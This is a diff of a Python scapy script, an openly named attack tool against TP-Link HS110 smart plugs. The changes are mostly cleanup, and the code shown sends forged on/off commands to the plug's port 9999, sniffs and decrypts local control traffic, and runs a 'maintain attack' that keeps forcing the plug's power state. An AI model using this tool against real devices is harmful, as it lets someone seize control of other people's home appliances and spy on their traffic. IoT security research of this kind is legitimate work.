@@ -3,13 +3,14 @@
 from scapy.all import *
 from binascii import unhexlify
 from time import sleep
-import nmap3
 import socket
 import os
 import signal
 import sys
 import threading
 
+# Spinner class for spinning wheel.
+# Used to indicate that the program is doing something.
 class Spinner:
   busy = False
   delay = 0.1
@@ -43,9 +44,9 @@ class Spinner:
       return False
 
 
+# TP_Link HS110 Attack
 class TP_Link_Attack():
   victim_port = 9999
-  iface= None
   repeat = False
 
   commands = {
@@ -68,14 +69,8 @@ class TP_Link_Attack():
   }
 
 
-  # @param iface  Network interface of attacker.
-  def __init__(self, iface):
-    self.iface = iface
-    #self.on_cmd = self.construct_switch_cmd(on=True)
-    #self.off_cmd = self.construct_switch_cmd(on=False)
-
+  def __init__(self):
     signal.signal(signal.SIGINT, self.signal_handler)
-    
 
   def signal_handler(self, sig, frame):
     if not self.repeat:
@@ -158,13 +153,6 @@ class TP_Link_Attack():
       s.connect((ip, self.victim_port))
       ss = StreamSocket(s)
 
-      #s.send(payload)
-
-      #ss.send(Raw(payload))
-
-      # Get status report
-      #pkt = ss.sniff(iface=self.iface, timeout=timeout, count=1, filter="tcp[tcpflags] & tcp-push != 0")
-
       pkt = ss.sr1(Raw(payload), timeout=timeout, verbose=0)
 
     return pkt
@@ -172,7 +160,7 @@ class TP_Link_Attack():
  
   # sniffs and decrypts packets coming to and from controlling devices on the subnet
   # NOTE: Does NOT decrypt TLS streams from remote server to TP_LINK device 
-  def sniff_and_decrypt(self, ip):
+  def sniff_and_decrypt(self, ip, iface):
     # PSH = 0x08
     custom_filter = lambda pkt: pkt.haslayer(IP) and pkt.haslayer(TCP) and \
         ((pkt[IP].dst == ip and pkt[TCP].dport == self.victim_port and pkt[TCP].flags & 0x08) or \
@@ -181,7 +169,7 @@ class TP_Link_Attack():
         if pkt[IP].dst == ip else \
         pkt[IP].dst + " <- " + pkt[IP].src + "\n" + self.decrypt(raw(pkt[Raw]).hex()) + "\n"
 
-    sniff(iface=self.iface, lfilter=custom_filter, prn=printer)
+    sniff(iface=iface, lfilter=custom_filter, prn=printer)
     print("\nSniffing stopped...\n")
 
 
@@ -240,13 +228,6 @@ class TP_Link_Attack():
   # Continious mode: uses one continuous TCP connection and sends a command every $delay seconds.
   # Non-continuous mode: wait to resend command when activity happens with device (e.g. notifying app)
   def maintain_attack(self, ip, on=False, continuous=False, delay=1, timeout=2):
-    # True if packets are related to the victim and that a FIN flag exists (TCP)
-    # Helps prevent flooding the network
-    #fin_filter = lambda pkt: pkt.haslayer(IP) and \
-    #    (pkt[IP].dst == ip or pkt[IP].src == ip) and \
-    #    (pkt[IP].dst != get_if_addr(self.iface) or pkt[IP].src != get_if_addr(self.iface)) and \
-    #    pkt.haslayer(TCP) and (pkt[TCP].flags & 0x01)
-
     self.repeat = True
 
     print("Starting maintain attack...")
@@ -261,12 +242,9 @@ class TP_Link_Attack():
               self.send_cmd(ip, "off", timeout=timeout)
 
             sleep(delay)
-
-            # Wait until someone turned it on or off
-            #sniff(iface=self.iface, count=1, timeout=delay, lfilter=fin_filter)
         else:
           # Use one continuous TCP session to execute the attack
-          # Sends (on/off) cmd every 1 seconds
+          # Sends (on/off) cmd every 'delay' seconds
           with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.settimeout(timeout)
             s.connect((ip, self.victim_port))
